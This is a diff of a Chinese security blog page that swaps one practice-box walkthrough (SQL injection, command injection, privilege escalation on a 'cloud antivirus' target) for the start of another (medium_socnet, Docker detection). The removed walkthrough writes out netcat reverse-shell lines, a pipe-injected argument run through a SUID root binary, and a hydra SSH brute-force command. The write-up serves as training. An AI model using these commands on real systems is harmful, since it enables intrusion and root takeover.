@@ -6,20 +6,74 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://blog.warrenli.fun">
-  <title>Warrenli&#39;s blog</title>
+  <title>categories | Warrenli&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="靶机背景： 是一个云防病毒扫描服务，目前处于测试阶段； 端口扫描发现对方开启了8080和22端口 网页分析网页有一个让我们输入密码登陆云防病毒后台的页面。 攻击思路： 逻辑漏洞-sql注入 or 暴力破解 暴力破解 我们抓包，然后爆破。 这里爆破有个小技巧，就是把键盘上所有的符号都输入一边，这样做是因为这可能触发一些错误，从而我们获得一些报错信息。 经过测测试，”这个符号让对方报了错，是sql注入">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Warrenli&#39;s blog">
-<meta property="og:url" content="https://blog.warrenli.fun/categories/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.SQL%E6%B3%A8%E5%85%A5+nc%E5%BC%B9shell%E6%8A%80%E5%B7%A7+nc%E4%BC%A0%E6%96%87%E4%BB%B6+sqlite3%E5%B7%A5%E5%85%B7+hydra%E5%A4%9A%E4%B8%AA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%9A%84ssh%E7%88%86%E7%A0%B4.html">
+  <meta name="description" content="主机发现与端口扫描  发现5000端口跑了一个http，如果我们去搜索一下这个Werkzeug，会发现这是一个基于python的web库。  http页面访问 仅有的输入位置尝试了xss后无果，我们进行一个常规操作了：路径扫描  发现一个admin路径，访问一下。  反弹shell发现我们的输入，会被exec执行，我们尝试反弹shell。 把这个后面的命令复制下来修改一下放上去。   也是成功弹">
+<meta property="og:type" content="article">
+<meta property="og:title" content="categories">
+<meta property="og:url" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/index.html">
 <meta property="og:site_name" content="Warrenli&#39;s blog">
-<meta property="og:description" content="靶机背景： 是一个云防病毒扫描服务，目前处于测试阶段； 端口扫描发现对方开启了8080和22端口 网页分析网页有一个让我们输入密码登陆云防病毒后台的页面。 攻击思路： 逻辑漏洞-sql注入 or 暴力破解 暴力破解 我们抓包，然后爆破。 这里爆破有个小技巧，就是把键盘上所有的符号都输入一边，这样做是因为这可能触发一些错误，从而我们获得一些报错信息。 经过测测试，”这个符号让对方报了错，是sql注入">
+<meta property="og:description" content="主机发现与端口扫描  发现5000端口跑了一个http，如果我们去搜索一下这个Werkzeug，会发现这是一个基于python的web库。  http页面访问 仅有的输入位置尝试了xss后无果，我们进行一个常规操作了：路径扫描  发现一个admin路径，访问一下。  反弹shell发现我们的输入，会被exec执行，我们尝试反弹shell。 把这个后面的命令复制下来修改一下放上去。   也是成功弹">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-25T07:09:47.278Z">
-<meta property="article:modified_time" content="2025-03-25T07:09:47.278Z">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726826311139-20ac13c0-7a77-4f4e-94ff-bbd97ab127bb.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726826331482-2b586ff2-32df-4b48-bdc4-12de3a6052cc.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827338150-be7cc39f-110d-49cb-a138-e64af4b882d6.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827794718-f2d2599d-021a-4b07-80a4-afc84d6b96d8.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827953672-a6cc0370-b4df-4d03-b8c1-3fa5f9a3452c.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828179818-6de5846d-2b05-4257-8923-7c47f295942a.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828528175-a0a8f65c-f5d6-4509-88ab-60da78db8c26.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828761346-14fa63eb-ad09-4f27-8531-68426f38573f.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829203021-a7337b94-7301-455d-9c25-c1b3c8af2a20.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829740166-eac31356-ecbc-4fbd-a049-e431ae20f61b.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829898860-163805e4-892a-460a-9396-cb69dcae4653.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829963906-ee17a866-9f76-475e-aba9-47b7354faf78.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726830246530-8f429db7-dfd2-487a-8323-76191e64ce63.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726832148883-7531695d-fab9-4c96-a404-0eb8a218b315.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837586777-5119cead-fbcb-46c4-97b2-595014bf25a8.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837411743-8e3331c1-4d5b-425e-85a2-f295f4ffd669.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837779463-d4b4bf7f-4e30-48d3-8835-7ded2c724ee7.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837927171-fb8f8051-162b-47bf-9a0b-fd8b8cfabcf0.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838068578-971dcf52-68b6-4125-8efd-4716b169e6b3.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838092403-0ae6bb78-69e6-4cbc-97fd-4b1c06e24cac.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838215498-edaf5e96-796b-4723-8493-9d644ae36487.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726838809680-95176136-2bd1-4d5a-afda-39edf5e41300.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838830231-90d63b15-d4ef-4f99-ad8c-4f87edfe6f44.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726838897350-922288bb-2c83-4deb-ab5a-d1d1307f378c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839200697-47c94eff-0b38-4161-894d-1be6b7c90a6a.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726839336713-cf2fa262-da43-4ad5-91c4-df0149c3382f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839388049-e9068aed-0c48-462a-a12e-0ec478080d6a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839589239-b69bb733-7df2-4b4f-b78a-e070f6b16db6.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726839805246-69a04011-7f51-4c09-b957-23a30d2211cc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839830398-02b300b5-c806-4ab7-9fd3-4078eb81292c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839860027-9ff74866-89da-4966-a329-ba5fd0b73075.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839874396-7fd101fc-5620-498e-b178-3b3331599672.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839932584-95451521-5d03-40aa-861b-ba7f4aa76e4f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839978966-49e663a9-e77e-4c75-babd-f6f064a437e7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840021951-29580041-aa1c-4ef3-99e1-a2ad39c161b8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840190565-4a5d32bc-e048-4817-97c0-dc576d355831.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840326559-d21e5d3e-0f27-48b4-bb86-06b8847c8d15.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840568720-aac07742-b073-457f-9d45-ef42ed634d65.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840699955-65692927-2d6c-4384-bf27-ca7b603ba287.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840811310-01f18959-8bd9-40ec-894c-6c90ee56174e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840883150-e9a5fbfc-3ba9-478b-a6c0-53c3998635af.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841043731-e17b9af3-574a-4f3e-958e-e8aaa2916f50.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841175066-e621ea59-c80d-4187-b091-cca939ab6985.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841188771-435a5772-e800-4344-bb3e-85c8a11b3fce.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841480260-5e4aa179-e856-4e9e-80e9-c5c92664d9d4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841915536-911145b1-c2ce-4067-9116-a551a83aded9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841967103-46aae682-6cbb-4e50-bd9b-8e40e50479bd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842119602-d807c7e9-b980-47a7-9908-bd0048bebb26.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842175126-d8980fe9-6d44-4580-a365-54c09ff0b174.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842246409-0e0367d9-0d49-4005-81b7-5a7559e799fd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842597240-8c3caa3c-b8a4-4e4c-ba09-907e8383de7b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842683775-322950b6-b71d-4ec0-ab78-8b66208d15de.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842763169-539d8ec4-c87b-449c-9524-3f49c14cb47e.png">
+<meta property="article:published_time" content="2025-04-02T06:49:30.000Z">
+<meta property="article:modified_time" content="2025-04-02T06:49:30.042Z">
 <meta property="article:author" content="Warrenli">
 <meta property="article:tag" content="网安，web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726826311139-20ac13c0-7a77-4f4e-94ff-bbd97ab127bb.png">
   
     <link rel="alternative" href="/atom.xml" title="Warrenli&#39;s blog" type="application/atom+xml">
   
@@ -143,70 +197,154 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-1.内网穿透Venom+searchsploit搜漏洞+内核提权：medium_socnet" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      categories
+    </h1>
+  
+
+        
+        <a href="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/" class="archive-article-date">
+  	<time datetime="2025-04-02T06:49:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>靶机背景：</p>
-<p>是一个云防病毒扫描服务，目前处于测试阶段；</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>发现对方开启了8080和22端口</p>
-<h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>网页有一个让我们输入密码登陆云防病毒后台的页面。</p>
-<p>攻击思路：</p>
-<p>逻辑漏洞-sql注入 or 暴力破解</p>
-<p><strong>暴力破解</strong></p>
-<p>我们抓包，然后爆破。</p>
-<p>这里爆破有个小技巧，就是把键盘上所有的符号都输入一边，这样做是因为这可能触发一些错误，从而我们获得一些报错信息。</p>
-<p>经过测测试，”这个符号让对方报了错，是sql注入。</p>
-<p>报错页面返回了我们执行的语句，发现能用万能密码。</p>
-<p>登陆成功后，发现能看到一些文件，我们能判断出这是执行力ls -l命令所看到的，服务器将结果返回给我们的页面了。</p>
-<p>网页上还有一个输入框，后面有一个scan按钮。</p>
-<p>由于这是一个病毒扫描的服务，我们推断，当我们的输入框中输入某个文件，并按下scan时，对方执行类似于avscan file的命令来扫描这个文件，以查杀病毒（avscan是一个病毒扫描工具）。</p>
-<p>那这也就相当于对方执行了命令，我们可以利用这个执行多个命令。</p>
-<p>管道符号可以帮助我们实现：</p>
-<p>比如输入：1.txt | ls</p>
-<p>ls不接受数据，只列出文件，所以扫描1.txt的结果不会显示出来。</p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然能执行命令，那我们尝试来反弹shell。</p>
-<p>我们这次想要用nc来弹shell。</p>
-<p>执行：1.txt | whitch nc 来判断对方是否有nc</p>
-<p>弹shell：1.txt | nc ip port -e &#x2F;bin&#x2F;sh</p>
-<p>然而kali并没有收到弹的shell。</p>
-<p>这是因为有的nc版本没有-e参数。</p>
-<p>我们将-e后面的参数先删掉。</p>
-<p>结果成功弹过来了。</p>
-<p>但这个并不是完整的shell，我们该怎么通过nc拿到完整shell呢？</p>
-<p>技巧：</p>
-<p>1.txt | nc ip port |&#x2F;bin&#x2F;bash|nc ip port</p>
-<p>这样一来nc建立的连接所执行的命令由bash解析，然后再将解析的结果交给另一个连接（新端口）。</p>
-<p>我们通过第一个连接输入命令，然后在第二个连接中看到结果</p>
-<h2 id="敏感文件查找"><a href="#敏感文件查找" class="headerlink" title="敏感文件查找"></a>敏感文件查找</h2><p>我们能看到当前的目录下有一个database.sql文件，我们用file命令查看一下，发现是本地数据库SQLite的数据库文件。既然是本地数据库，那这里很可能有敏感信息。</p>
-<p>我们尝试用sqlite工具查看这个文件，想要查看，得先将对方的文件传过来，在本地查看（本地有这个工具）。</p>
-<h2 id="利用nc传文件"><a href="#利用nc传文件" class="headerlink" title="利用nc传文件"></a>利用nc传文件</h2><p>kali本机nc -lvnp port &gt; db.sql</p>
-<p>对方nc ip port &lt; database.sql</p>
-<h2 id="sqlite3工具使用"><a href="#sqlite3工具使用" class="headerlink" title="sqlite3工具使用"></a>sqlite3工具使用</h2><p>先输入sqlite3进入终端</p>
-<p>执行:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">open</span> db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>
-
-<p>执行完可以看到了对方执行的命令，里面有对方插入的密码。</p>
-<p>有了密码，我们尝试连接用户，查看&#x2F;etc&#x2F;passwd文件，对里面的用户挨个尝试。</p>
-<p>注意尝试的是哪些能通过&#x2F;bin&#x2F;bash登陆的用户，我们用grep筛选一下</p>
-<h2 id="ssh爆破–hydra"><a href="#ssh爆破–hydra" class="headerlink" title="ssh爆破–hydra"></a>ssh爆破–hydra</h2><p>将可用的用户都放入一个文件user.txt</p>
-<p>将密码都放入一个文件passwd.txt</p>
-<p>命令：</p>
-<p><code>hydra -L user.txt -P passwd.txt ssh://ip</code></p>
-<p>然而没有一个可以使用的，此路不同。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>经过在当前路径下的一番查找，并没有找到有利于提权的文件。</p>
-<p>我们返回上一级路径，再次查看一下，发现了一个.c的文件，同时有一个和它同名的可执行文件，我们有理由怀疑这个文件就是c文件经过编译后的可执行程序。</p>
-<p>令我们惊喜的是，这个可执行文件有suid的标记位，并且其属主是root。</p>
-<p>假如我们能用这个文件反弹shell，那就弹过来root权限。</p>
-<p>我们先查看一下源文件：</p>
-<p>发现该程序仅仅是调用了当前系统的一个工具freshclam（病毒库更新程序），并要求我们提供一个参数（没说什么是参数）。</p>
-<p>先执行.&#x2F;update_cloudav a</p>
-<p>这个a是随便给的。</p>
-<p>发现对方报了个错，但信息不全。</p>
-<p>我们大胆尝试一下.&#x2F;update_cloudav “a|nc ip port1|&#x2F;bin&#x2F;bash|nc ip port2”</p>
-<p>之所以用””包起来，是因为我们要让这个程序将后面的所有都作为它的参数。</p>
-<p>kali收到新连接的shell后会发现就是root</p>
+        <hr>
+<h2 id="主机发现与端口扫描"><a href="#主机发现与端口扫描" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726826311139-20ac13c0-7a77-4f4e-94ff-bbd97ab127bb.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726826331482-2b586ff2-32df-4b48-bdc4-12de3a6052cc.png"></p>
+<p>发现5000端口跑了一个http，如果我们去搜索一下这个Werkzeug，会发现这是一个基于python的web库。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827338150-be7cc39f-110d-49cb-a138-e64af4b882d6.png"></p>
+<h2 id="http页面访问"><a href="#http页面访问" class="headerlink" title="http页面访问"></a>http页面访问</h2><p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827794718-f2d2599d-021a-4b07-80a4-afc84d6b96d8.png"></p>
+<p>仅有的输入位置尝试了xss后无果，我们进行一个常规操作了：路径扫描</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726827953672-a6cc0370-b4df-4d03-b8c1-3fa5f9a3452c.png"></p>
+<p>发现一个admin路径，访问一下。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828179818-6de5846d-2b05-4257-8923-7c47f295942a.png"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>发现我们的输入，会被exec执行，我们尝试反弹shell。</p>
+<p>把这个后面的命令复制下来修改一下放上去。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828528175-a0a8f65c-f5d6-4509-88ab-60da78db8c26.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726828761346-14fa63eb-ad09-4f27-8531-68426f38573f.png"></p>
+<p>也是成功弹过来了。查看一下，居然是root，然而事情还没有结束，这是一道中等难度的题目，没这么简单。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829203021-a7337b94-7301-455d-9c25-c1b3c8af2a20.png"></p>
+<h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><p>我们看到，当前目录下面有一个Dockerfile的目录，这引起了我们的注意。</p>
+<p>Dockerfile通常在生产环境下去标准化的部署docker容器，部署开发环境的时候会使用的一个模板文件。</p>
+<p>这个模板文件会包含一系列的，如何去引入docker映像，如何对映像进行配置的方法。研发人员将这个模板文件分发给应用的部署人员，然后应用的部署人员，利用该文件，在生产环境的服务器上，统一的、标准化的大量的部署docker容器出来。</p>
+<p>既然我们进入的系统存在这个文件，那是否意味着，我们当前进入的这个系统是一个docker容器的系统。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829740166-eac31356-ecbc-4fbd-a049-e431ae20f61b.png"></p>
+<p>可以看到，这是一个标准的docker模板文件。这更加让我们怀疑这是一个docker，但怀疑终究只是怀疑，我们还不能下定论。</p>
+<p>如何确定这就是一个docker呢？</p>
+<p>法一：查看一下&#x2F;下面是否有一个.dockerenv文件，若有则基本能说明是docker</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829898860-163805e4-892a-460a-9396-cb69dcae4653.png"></p>
+<p>方法二：如果结果和下图一样，那也基本确定了</p>
+<p>这个1是初始化进程id，cgroup明确包含了docker的映像主机信息。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726829963906-ee17a866-9f76-475e-aba9-47b7354faf78.png"></p>
+<p><strong>proc文件简介：</strong></p>
+<blockquote>
+<p><font style="color:rgb(77, 77, 77);">Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</font></p>
+<p><font style="color:rgb(77, 77, 77);">用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统是动态从系统内核读出所需信息并提交的。下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。 Sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。</font></p>
